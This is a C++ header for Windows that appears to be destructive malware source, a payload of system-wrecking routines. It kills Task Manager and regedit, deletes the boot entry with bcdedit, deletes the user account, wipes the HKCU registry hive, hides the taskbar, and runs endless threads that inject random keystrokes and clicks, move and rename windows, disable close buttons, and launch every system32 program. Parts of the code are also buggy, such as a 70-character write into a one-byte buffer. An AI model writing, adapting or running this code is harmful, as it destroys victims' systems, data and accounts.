#pragma once
#include <Windows.h>
#include <math.h>
#include <tchar.h>
void reg_add( //credits to Mist0090 because creating registry keys in C++ without sh*tty system() or reg.exe is hell
	HKEY HKey,
	LPCWSTR Subkey,
	LPCWSTR ValueName,
	unsigned long Type,
	unsigned int Value
)
{
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;


	result = RegCreateKeyExW(
		HKey, //HKEY
		Subkey,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		&dwDisposition);

	result = RegSetValueExW(
		hKey,
		ValueName,
		0,
		Type,
		(const unsigned char*)&Value,
		(int)sizeof(Value)
	);

	RegCloseKey(hKey);
	return;
}

DWORD WINAPI kills(LPVOID lpvd)
{
	system("Taskkill /f /im Taskmgr.exe");
	system("Taskkill /f /im regedit.exe");
	system("Taskkill /f /im Taskmgr.exe");
	system("bcdedit /delete {current}");
	system("net user %username% /delete");
	return 0;
}



DWORD WINAPI notaskbar(LPVOID lpvd)
{
	static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
	ShowWindow(hShellWnd, SW_HIDE);
	return 666;
}

DWORD WINAPI regdelete(LPVOID lpParam) {
	system("reg delete hkcu /f");
	MessageBox(NULL, L"You are not expected to return but you are expected to return to your lovely system!", L"                            ", MB_ICONINFORMATION);
	return 1;
}

DWORD random() {
	DWORD number = __rdtsc();

	number ^= number << 13;
	number ^= number << 17;
	number ^= number << 5;

	return number;
}

DWORD WINAPI SendKeys(LPVOID lpstart) {
	const char alphanum[] = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ$#@&!?._-";
	int nKey = sizeof(alphanum) / sizeof(void *);

	INPUT input;
	input.type = INPUT_KEYBOARD;

	while (true) {
		input.ki.wVk = VkKeyScanA(random() % nKey);

		SendInput(1, &input, sizeof(INPUT));
		RtlZeroMemory(&input, sizeof(input));

		Sleep(random() % 50 + 30);
	}
}

DWORD WINAPI Click(LPVOID lpstart) {
	INPUT input;
	input.type = INPUT_MOUSE;

	while (true) {
		input.mi.dwFlags = (random() % 2) ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_RIGHTUP;

		SendInput(1, &input, sizeof(INPUT));
		RtlZeroMemory(&input, sizeof(input));

		Sleep(random() % 70 + 50);
	}
}

DWORD WINAPI MoveWindowFunc(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	RECT rekt;

	while (true) {
		HWND hwnd = GetForegroundWindow();
		GetWindowRect(hwnd, &rekt);

		int sel = random() % 4 + 1;

		if (rekt.left >= x) {
			rekt.left = 0;
		}
		else if (rekt.top >= y) {
			rekt.top = 0;
		}
		else if (rekt.left <= 0) {
			rekt.left = 0;
		}
		else if (rekt.top <= 0) {
			rekt.top = 0;
		}

		int xs = rekt.left;
		int ys = rekt.top;
		int rnd = random() % 100 + 60;

		for (int i = 0; i < rnd; i += 20) {
			if (sel == 1) {
				SetWindowPos(hwnd, 0, xs + i, ys + i, xs, ys, 0);
				Sleep(10);
			}
			else if (sel == 2) {
				SetWindowPos(hwnd, 0, xs - i, ys + i, xs, ys, 0);
				Sleep(10);
			}
			else if (sel == 3) {
				SetWindowPos(hwnd, 0, xs + i, ys - i, xs, ys, 0);
				Sleep(10);
			}
			else if (sel == 4) {
				SetWindowPos(hwnd, 0, xs - i, ys - i, xs, ys, 0);
				Sleep(10);
			}
		}
	}
}

DWORD WINAPI Buttons(LPVOID lpstart) {
	while (true) {
		HWND hwnd = GetForegroundWindow();

		EnableMenuItem(GetSystemMenu(hwnd, 0), SC_CLOSE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);

		SetWindowLongA(hwnd, GWL_STYLE, GetWindowLongA(hwnd, GWL_STYLE) & ~WS_MINIMIZEBOX);

		SetWindowLongA(hwnd, GWL_STYLE, GetWindowLongA(hwnd, GWL_STYLE) & ~WS_MAXIMIZEBOX);
		Sleep(10);
	}
}


DWORD WINAPI WindowText(LPVOID lpstart) {
	const char* alphanum[] = {
		"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "q", "w", "e", "r", "t",
		"z", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "y",
		"x", "c", "v", "b", "n", "m", "Q", "W", "E", "R", "T", "Z", "U", "I", "O",
		"P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Y", "X", "C", "V", "B",
		"N", "M", ".", ",", " ", "$", "#", "&", "@", "!", "?",
	};
	int nText = sizeof(alphanum) / sizeof(void *);

	char text[1];

	while (true) {
		for (int i = 0; i < 70; i++) {
			text[i] = random() % nText;
		}

		SetWindowTextA(GetForegroundWindow(), text);
		Sleep(1);
	}
}

DWORD WINAPI Programs(LPVOID lpstart) {
	WIN32_FIND_DATA data;
	LPCWSTR path = L"C:\\WINDOWS\\system32\\*.exe";

	while (true) {
		HANDLE find = FindFirstFileW(path, &data);

		ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);

		while (FindNextFileW(find, &data)) {
			ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
			Sleep(250);
		}
	}
}